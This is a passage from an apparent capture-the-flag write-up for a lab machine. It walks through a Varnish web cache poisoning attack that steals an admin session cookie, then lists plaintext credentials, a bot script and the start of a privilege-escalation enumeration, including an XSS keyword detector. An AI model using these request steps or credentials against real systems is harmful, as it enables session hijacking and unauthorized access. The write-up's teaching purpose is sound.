<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">The</span> <span class="n">X</span><span class="o">-</span><span class="n">Varnish</span> <span class="n">HTTP</span> <span class="n">header</span> <span class="n">allows</span> <span class="n">you</span> <span class="n">to</span> <span class="n">find</span> <span class="n">the</span> <span class="n">correct</span> <span class="n">log</span><span class="o">-</span><span class="n">entries</span> <span class="k">for</span> <span class="n">the</span> <span class="n">transaction</span><span class="o">.</span> <span class="n">For</span> <span class="n">a</span> <span class="n">cache</span> <span class="n">hit</span><span class="p">,</span> <span class="n">X</span><span class="o">-</span><span class="n">Varnish</span> <span class="n">will</span> <span class="n">contain</span> <span class="n">both</span> <span class="n">the</span> <span class="n">ID</span> <span class="n">of</span> <span class="n">the</span> <span class="n">current</span> <span class="n">request</span> <span class="ow">and</span> <span class="n">the</span> <span class="n">ID</span> <span class="n">of</span> <span class="n">the</span> <span class="n">request</span> <span class="n">that</span> <span class="n">populated</span> <span class="n">the</span> <span class="n">cache</span><span class="o">.</span> <span class="n">It</span> <span class="n">makes</span> <span class="n">debugging</span> <span class="n">Varnish</span> <span class="n">a</span> <span class="n">lot</span> <span class="n">easier</span>
</pre></div>
</div>
<p>After a lot of research and trial and error, I figured out that cache poisonning is possible<br />
<a class="reference external" href="https://portswigger.net/web-security/web-cache-poisoning">Port Swigger - web-cache-poisoning</a><br />
As we pointed out before the escalate endpoint does not filter out urls that are based on the ip of the local machine, so we can do a cache poisonning attack this way:</p>
<ul class="simple">
<li><p>1 set the link to a random, non existing address in the /static path on the box, as long as it’s based on the boxe’s ip this won’t get filtered out.</p></li>
<li><p>2 admin goes to the address and the server responds 404, but with a Set-Cookie header for admin.</p></li>
<li><p>3 that response gets cached by varnish, including the Set-Cookie header with the session cookie</p></li>
<li><p>4 Finally we GET that address ourselves, and now the varnish cache serves the previously cached response to us, including the admin cookie</p></li>
</ul>
<p>1:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">escalate</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="mf">10.10.11.188</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">136</span>
<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.188</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.188</span><span class="o">/</span><span class="n">escalate</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">__hstc</span><span class="o">=</span><span class="mf">37486847.6174496460614</span><span class="n">d702b6fac7d5e4b635e</span><span class="mf">.1676462479653.1676462479653.1676462479653.1</span><span class="p">;</span> <span class="n">hubspotutk</span><span class="o">=</span><span class="mi">6174496460614</span><span class="n">d702b6fac7d5e4b635e</span><span class="p">;</span> <span class="n">__hssrc</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="n">__hssc</span><span class="o">=</span><span class="mf">37486847.6.1676462479653</span><span class="p">;</span> <span class="n">session</span><span class="o">=</span><span class="n">b6079287</span><span class="o">-</span><span class="n">ba7b</span><span class="o">-</span><span class="mi">417</span><span class="n">c</span><span class="o">-</span><span class="n">acfa</span><span class="o">-</span><span class="mi">7</span><span class="n">f1360c52f91</span>

<span class="n">to</span><span class="o">=</span><span class="n">Admin</span><span class="o">&amp;</span><span class="n">link</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.188</span><span class="o">/</span><span class="n">static</span><span class="o">/</span><span class="n">haaaaaa</span><span class="o">.</span><span class="n">zoinks</span><span class="o">&amp;</span><span class="n">reason</span><span class="o">=&amp;</span><span class="n">issue</span><span class="o">=</span><span class="n">Getting</span> <span class="n">error</span> <span class="k">while</span> <span class="n">accessing</span> <span class="n">search</span> <span class="n">feature</span> <span class="ow">in</span> <span class="n">enterprise</span> <span class="n">platform</span><span class="o">.</span>
</pre></div>
</div>
<p>2:<br />
Wait for admin to go click on that</p>
<p>3:<br />
Varnish caches the response served to admin</p>
<p>4:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>curl -i http://10.10.11.188/static/haaaaaa.zoinks
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/2.1.2 Python/3.8.10
Date: Sat, 18 Feb 2023 22:14:01 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Set-Cookie: session=2a714102-574b-40b6-8bdd-422335897bc7; HttpOnly; Path=/
cache-control: public, max-age=240
X-Varnish: 295051 295039
Age: 47
Via: 1.1 varnish (Varnish/6.2)
Connection: keep-alive

&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</pre></div>
</div>
<p>We can now use that cookie and access <code class="docutils literal notranslate"><span class="pre">/admin_tickets</span></code>, and there’s some credentials exposed in the ticket <code class="docutils literal notranslate"><span class="pre">diego:dCb#1!x0%gjq</span></code>  :<br />
<img alt="admin.png" src="../../../../_images/admin1.png" /></p>
</section>
<section id="privesc-enum">
<h2>Privesc enum<a class="headerlink" href="#privesc-enum" title="Permalink to this heading">#</a></h2>
<p>Looking around, there is a .keras/keras.json thing that seems to be config files in relations to tensorflow.</p>
<p>There’s also a  user.py script in diego’s homefolder, with hardcoded credentials for a local mysql instance, that’s the same credentials we already have.<br />
It reads the forgot links in the database, so this is what we caught when we store the reset link.<br />
Then opens the escalated links from the database, presumably the ones uploaded by the users of the app.<br />
It logs in to the web app, with hardcoded creds again for admin, recovers the cookie, from the response, then with that cookie it iterates through each of the links in the db sends 3 gets with the cookie, and removes the entrie from the db.
That’s the cookie that got cached and that we managed to steal to get there.
So we now have 2 sets for creds, 3 if we go look in the database:</p>
<p><code class="docutils literal notranslate"><span class="pre">robert-dev-*:dCvf34&#64;3#8(6</span></code><br />
<code class="docutils literal notranslate"><span class="pre">diego:dCb#1!x0%gjq</span></code><br />
<code class="docutils literal notranslate"><span class="pre">admin:dCvbgFh345_368352c&#64;!</span></code></p>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">mysql.connector</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">netifaces</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">ni</span>

<span class="c1"># Fetch Links</span>
<span class="n">conn</span> <span class="o">=</span> <span class="n">mysql</span><span class="o">.</span><span class="n">connector</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="n">database</span><span class="o">=</span><span class="s2">&quot;app&quot;</span><span class="p">,</span><span class="n">user</span><span class="o">=</span><span class="s2">&quot;diego&quot;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s2">&quot;dCb#1!x0</span><span class="si">%g</span><span class="s2">jq&quot;</span><span class="p">)</span>
<span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;select * from forgot&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

<span class="c1"># Open reset links</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

<span class="c1"># Open tickets as admin</span>
<span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;select * from escalate&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
<span class="n">tun_ip</span> <span class="o">=</span> <span class="n">ni</span><span class="o">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="s1">&#39;eth0&#39;</span><span class="p">)[</span><span class="n">ni</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">&#39;addr&#39;</span><span class="p">]</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">tun_ip</span><span class="si">}</span><span class="s1">/login&#39;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="s1">&#39;dCvbgFh345_368352c@!&#39;</span><span class="p">})</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span><span class="n">cookie</span><span class="p">})</span>
                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span><span class="n">cookie</span><span class="p">})</span>
                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;session&#39;</span><span class="p">:</span><span class="n">cookie</span><span class="p">})</span>
                <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;delete from escalate where link=</span><span class="si">%s</span><span class="s1">&#39;</span><span class="p">,(</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">],))</span>
                <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
        <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>
<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
<p>ml security… maybe this has something to do with that keras thing</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>diego@forgot:~/app/static/images$<span class="w"> </span>sudo<span class="w"> </span>-l
Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>diego<span class="w"> </span>on<span class="w"> </span>forgot:
<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,<span class="w"> </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User<span class="w"> </span>diego<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>forgot:
<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/opt/security/ml_security.py
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>diego@forgot://opt/security/lib$<span class="w"> </span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>-1<span class="k">)</span><span class="p">;</span><span class="k">do</span><span class="w"> </span>file<span class="w"> </span><span class="nv">$i</span><span class="p">;</span><span class="k">done</span>
d2v.model:<span class="w"> </span>data
DecisionTreeClassifier.sav:<span class="w"> </span>data
GaussianNB.sav:<span class="w"> </span>data
KNeighborsClassifier.sav:<span class="w"> </span>data
MLPClassifier.sav:<span class="w"> </span>data
RandomForestClassifier.sav:<span class="w"> </span>data
SVC.sav:<span class="w"> </span>data
</pre></div>
</div>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">csv</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pickle</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">mysql.connector</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">pandas</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">pd</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">parse</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">unquote</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">sklearn</span><span class="w"> </span><span class="kn">import</span> <span class="n">model_selection</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">nltk.tokenize</span><span class="w"> </span><span class="kn">import</span> <span class="n">word_tokenize</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">sklearn.linear_model</span><span class="w"> </span><span class="kn">import</span> <span class="n">LogisticRegression</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">gensim.models.doc2vec</span><span class="w"> </span><span class="kn">import</span> <span class="n">Doc2Vec</span><span class="p">,</span> <span class="n">TaggedDocument</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">tensorflow.python.tools.saved_model_cli</span><span class="w"> </span><span class="kn">import</span> <span class="n">preprocess_input_exprs_arg_string</span>

<span class="n">np</span><span class="o">.</span><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mi">42</span><span class="p">)</span>

<span class="n">f1</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/DecisionTreeClassifier.sav&#39;</span>
<span class="n">f2</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/SVC.sav&#39;</span>
<span class="n">f3</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/GaussianNB.sav&#39;</span>
<span class="n">f4</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/KNeighborsClassifier.sav&#39;</span>
<span class="n">f5</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/RandomForestClassifier.sav&#39;</span>
<span class="n">f6</span> <span class="o">=</span> <span class="s1">&#39;/opt/security/lib/MLPClassifier.sav&#39;</span>

<span class="c1"># load the models from disk</span>
<span class="n">loaded_model1</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f1</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">loaded_model2</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f2</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">loaded_model3</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f3</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">loaded_model4</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f4</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">loaded_model5</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f5</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">loaded_model6</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">f6</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">))</span>
<span class="n">model</span><span class="o">=</span> <span class="n">Doc2Vec</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="s2">&quot;/opt/security/lib/d2v.model&quot;</span><span class="p">)</span>

<span class="c1"># Create a function to convert an array of strings to a set of features</span>
<span class="k">def</span><span class="w"> </span><span class="nf">getVec</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
    <span class="n">features</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">text</span><span class="p">):</span>
        <span class="n">test_data</span> <span class="o">=</span> <span class="n">word_tokenize</span><span class="p">(</span><span class="n">line</span><span class="o">.</span><span class="n">lower</span><span class="p">())</span>
        <span class="n">v1</span> <span class="o">=</span> <span class="n">model</span><span class="o">.</span><span class="n">infer_vector</span><span class="p">(</span><span class="n">test_data</span><span class="p">)</span>
        <span class="n">featureVec</span> <span class="o">=</span> <span class="n">v1</span>
        <span class="n">lineDecode</span> <span class="o">=</span> <span class="n">unquote</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
        <span class="n">lowerStr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">lineDecode</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
        <span class="n">feature1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;object&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;embed&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;ilayer&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;layer&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;style&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;applet&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;meta&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;img&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">))</span>
        <span class="n">feature1</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;marquee&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for malicious method count</span>
        <span class="n">feature2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;exec&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;fromcharcode&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;eval&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;alert&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;getelementsbytagname&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;unescape&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;escape&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;prompt&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;onload&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;onclick&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;onerror&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;onpage&#39;</span><span class="p">))</span>
        <span class="n">feature2</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;confirm&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for &quot;.js&quot; count</span>
        <span class="n">feature3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;.js&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for &quot;javascript&quot; count</span>
        <span class="n">feature4</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;javascript&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for length of the string</span>
        <span class="n">feature5</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">lowerStr</span><span class="p">))</span>
        <span class="c1"># add feature for &quot;&lt;script&quot;  count</span>
        <span class="n">feature6</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">))</span>
        <span class="n">feature6</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&lt;script&#39;</span><span class="p">))</span>
        <span class="n">feature6</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&amp;lt;script&#39;</span><span class="p">))</span>
        <span class="n">feature6</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%3c</span><span class="s1">script&#39;</span><span class="p">))</span>
        <span class="n">feature6</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%3c%73%</span><span class="s1">63</span><span class="si">%72%</span><span class="s1">69</span><span class="si">%70%</span><span class="s1">74&#39;</span><span class="p">))</span>
        <span class="c1"># add feature for special character count</span>
        <span class="n">feature7</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;&quot;&#39;</span><span class="p">))</span>
        <span class="n">feature7</span> <span class="o">+=</span> <span class="nb">int</span><span class="p">(</span><span class="n">lowerStr</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">))</span>
